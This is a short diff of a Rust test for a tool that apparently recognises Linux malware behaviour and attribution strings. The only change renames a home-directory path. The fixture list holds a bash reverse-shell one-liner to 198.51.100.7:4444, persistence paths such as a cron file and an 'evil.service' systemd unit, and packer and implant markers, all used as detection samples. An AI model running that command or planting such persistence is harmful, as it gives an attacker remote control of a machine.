@@ -232,7 +232,7 @@ fn linux_behaviour_and_attribution_strings_are_recognised() {
         "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1",
         "/etc/cron.d/update",
         "/etc/systemd/system/evil.service",
-        "/home/dev/projects/loader/src/main.c",
+        "/home/user/projects/loader/src/main.c",
         "/rustc/0123456789abcdef0123456789abcdef01234567/library/core/src/fmt.rs",
         "github.com/someone/implant",
         "$Info: This file is packed with the UPX executable packer http://upx.sf.net $",
